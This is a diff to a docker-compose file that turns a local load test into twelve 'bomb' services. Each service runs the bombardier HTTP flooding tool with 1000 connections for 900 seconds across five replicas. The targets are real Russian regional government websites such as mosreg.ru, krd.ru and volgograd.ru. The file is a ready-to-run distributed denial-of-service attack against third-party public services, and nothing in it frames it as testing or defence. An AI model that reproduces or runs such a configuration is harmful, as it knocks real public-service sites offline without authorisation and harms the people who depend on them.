@@ -1,7 +1,77 @@
 version: '3'
 
 services:
-  test:
+  bomb01:
     image: alpine/bombardier
 #    entrypoint: ["bombardier","-c","1","-d","10s","-l","http://host.docker.internal:8090"]
-    command: -c 100 -d 10s -l http://host.docker.internal:8090
+    command: -c 1000 -d 900s -l https://www.stavregion.ru
+    deploy:
+      replicas: 5
+
+  bomb02:
+    image: alpine/bombardier
+    #    entrypoint: ["bombardier","-c","1","-d","10s","-l","http://host.docker.internal:8090"]
+    command: -c 1000 -d 900s -l https://krd.ru
+    deploy:
+      replicas: 5
+
+  bomb03:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://cheladmin.ru
+    deploy:
+      replicas: 5
+
+  bomb04:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l http://www.tula.ru
+    deploy:
+      replicas: 5
+
+  bomb05:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://ulgov.ru
+    deploy:
+      replicas: 5
+
+  bomb06:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l http://midural.ru
+    deploy:
+      replicas: 5
+
+  bomb07:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://orel-region.ru
+    deploy:
+      replicas: 5
+
+  bomb08:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://mosreg.ru
+    deploy:
+      replicas: 5
+
+  bomb09:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://apparat.lenobl.ru
+    deploy:
+      replicas: 5
+
+  bomb10:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://www.admoblkaluga.ru
+    deploy:
+      replicas: 5
+
+  bomb11:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://www.volgograd.ru
+    deploy:
+      replicas: 5
+
+  bomb12:
+    image: alpine/bombardier
+    command: -c 1000 -d 900s -l https://www.astrobl.ru
+    deploy:
+      replicas: 5
+
